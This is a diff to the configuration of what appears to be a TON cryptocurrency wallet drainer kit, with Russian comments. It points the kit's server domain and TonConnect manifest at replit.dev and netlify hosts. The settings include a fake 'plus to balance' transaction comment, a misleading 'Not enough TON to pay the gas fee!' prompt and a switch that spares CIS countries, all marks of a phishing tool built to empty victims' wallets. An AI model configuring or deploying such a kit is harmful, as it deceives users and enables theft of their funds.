@@ -1,4 +1,4 @@
-const server_domain = ""; //Ваш домен сервера в формате "domain.com"
+const server_domain = "https://55a8ee95-3a2b-436d-bd4b-f5a9ac01e5c3-00-3f9ttdhbun8a3.worf.replit.dev"; //Ваш домен сервера в формате "domain.com"
 
 //Дополнительные настройки:
 const dynamicTxt = "true"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
@@ -15,7 +15,7 @@ const p_message = 'Not enough TON to pay the gas fee!'; //Обычный тек�
 const sng = "true"; //Защита СНГ стран, включать только в целях тестирования.
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://raw.githubusercontent.com/DeviousCryptoLicks/Thing/refs/heads/main/tonconnect-manifest.json', //Сюда указать путь на ваш манифест
+    manifestUrl: 'https://steady-kulfi-0b08d6.netlify.app/tonconnect-manifest.json', //Сюда указать путь на ваш манифест
     buttonRootId: 'openModal'
 });
 
